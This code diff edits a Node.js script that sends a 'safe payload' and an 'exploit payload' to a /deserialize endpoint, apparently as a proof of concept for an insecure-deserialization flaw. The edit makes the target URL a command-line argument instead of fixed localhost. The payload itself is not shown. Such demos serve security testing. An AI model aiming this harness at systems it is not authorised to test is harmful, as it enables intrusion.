@@ -4,7 +4,8 @@ import path from 'path';
 import { fileURLToPath } from 'url';
 import { dirname } from 'path';
 
-const baseURL = 'http://localhost:5000/deserialize';
+const baseURL = process.argv[2] || 'http://localhost:5000/';
+const url = `${baseURL}/deserialize`;
 
 // Simulate __dirname in ES modules
 const __filename = fileURLToPath(import.meta.url);
@@ -45,7 +46,7 @@ const exploitPayload = {
 (async () => {
   try {
     console.log('📦 Sending safe payload...');
-    const safeRes = await axios.post(baseURL, safePayload);
+    const safeRes = await axios.post(url, safePayload);
     console.log('✅ Safe Response:', safeRes.data);
   } catch (err) {
     console.error('❌ Safe payload failed:', err.message);
@@ -53,7 +54,7 @@ const exploitPayload = {
 
   try {
     console.log('\n💣 Sending exploit payload...');
-    const exploitRes = await axios.post(baseURL, exploitPayload);
+    const exploitRes = await axios.post(url, exploitPayload);
     console.log('✅ Exploit Response:', exploitRes.data);
   } catch (err) {
     console.error('❌ Exploit failed:', err.message);
